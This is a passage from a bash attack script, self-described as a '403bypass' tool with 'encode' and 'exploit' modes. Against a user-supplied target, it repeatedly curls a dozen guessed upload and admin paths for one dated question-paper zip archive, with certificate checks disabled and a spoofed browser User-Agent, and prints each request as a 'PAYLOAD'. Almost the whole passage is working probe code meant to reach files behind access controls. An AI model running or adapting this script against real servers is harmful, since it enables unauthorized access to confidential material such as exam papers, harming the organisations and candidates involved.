${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print

}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
